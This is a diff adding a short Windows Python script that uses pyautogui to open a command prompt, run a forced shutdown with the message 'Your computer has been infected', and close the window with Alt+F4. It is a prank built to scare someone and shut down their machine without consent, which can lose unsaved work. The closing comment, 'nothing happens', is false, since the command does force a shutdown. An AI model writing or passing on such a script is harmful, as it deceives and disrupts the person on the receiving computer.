@@ -1,0 +1,22 @@
+#You can change the time if you want it to go faster.    \
+#this script only works for windows.                    \
+#THE CONCATENATION MAY BE WRONG                         \
+\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+_______________________________
+import pyautogui       
+import time                        
+
+pyautogui.press('win')
+time.sleep(1) 
+pyautogui.write('cmd')
+time.sleep(0.3)
+pyautogui.press('enter')
+time.sleep(1)
+pyautogui.write('shutdown -s -t 10 -c "Your computer has been infected"')
+time.sleep(1)
+pyautogui.press('enter')
+time.sleep(0.2)
+with pyautogui.hold('alt'):
+          pyautogui.press('f4')
+_________________________________      
+ #It's absurd but nothing happens.         
